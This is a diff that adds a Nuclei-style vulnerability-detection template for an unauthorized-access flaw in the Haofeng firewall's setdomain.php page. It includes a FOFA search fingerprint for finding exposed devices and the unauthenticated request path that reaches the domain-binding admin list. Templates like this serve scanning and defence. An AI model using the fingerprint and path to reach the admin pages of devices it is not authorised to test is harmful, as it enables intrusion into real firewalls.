@@ -1,0 +1,29 @@
+id: haofeng-firewall-setdomain-unauth
+
+info:
+  name: 皓峰防火墙 setdomain.php 越权访问漏洞
+  author: SleepingBag945
+  severity: medium
+  description: |
+    FOFA：app="皓峰防火墙系统登录"
+  reference: 
+    - http://wiki.peiqi.tech/wiki/iot/%E7%9A%93%E5%B3%B0/%E7%9A%93%E5%B3%B0%E9%98%B2%E7%81%AB%E5%A2%99%20setdomain.php%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/setdomain.php?action=list"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<title>皓峰系统管理平台</title>"
+          - "域名绑定列表"
+          - "[修改]"
+          - "[删除]"
+        condition: and
+        part: body
